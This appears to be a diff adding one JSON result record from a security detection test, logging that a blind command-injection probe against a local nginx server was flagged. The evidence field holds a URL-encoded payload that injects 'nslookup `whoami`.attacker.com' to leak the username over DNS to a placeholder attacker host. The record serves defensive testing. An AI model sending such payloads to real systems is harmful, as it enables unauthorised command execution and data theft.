@@ -1,0 +1,15 @@
+{
+  "pattern_id": "CMD_BLIND_004",
+  "test_id": "CMD_BLIND_004-1767070421405-d5jaep",
+  "category": "cmdinj",
+  "detected": true,
+  "expected_detection": true,
+  "latency_ms": 22000,
+  "evidence": "04:53:41.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BLIND_004-1767070421405-d5jaep pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1 method=GET",
+  "rule_name": "[NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BLIND_004-1767070421405-d5jaep pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1 method=GET",
+  "expected_rule": "Command Injection via Semicolon",
+  "rule_id": "",
+  "sent_at": 1767070443000,
+  "detected_at": 1767070421000,
+  "status": "passed"
+}
